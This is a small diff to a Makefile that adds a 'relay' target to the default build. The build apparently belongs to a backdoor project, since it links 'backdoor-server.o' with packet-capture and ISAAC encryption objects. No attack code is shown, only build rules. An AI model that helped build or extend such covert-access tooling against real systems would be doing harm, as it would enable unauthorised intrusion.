@@ -7,7 +7,7 @@ OUT_DIR = ../exe
 LIB_DIR = ./lib
 
 # all: directories main
-all: directories server client
+all: directories server client relay
 
 server: backdoor-server.o utils.o pktcap.o isaac_encryption.o
 	${CC} ${LDFLAGS} backdoor-server.o utils.o pktcap.o isaac_encryption.o -o ${OUT_DIR}/server
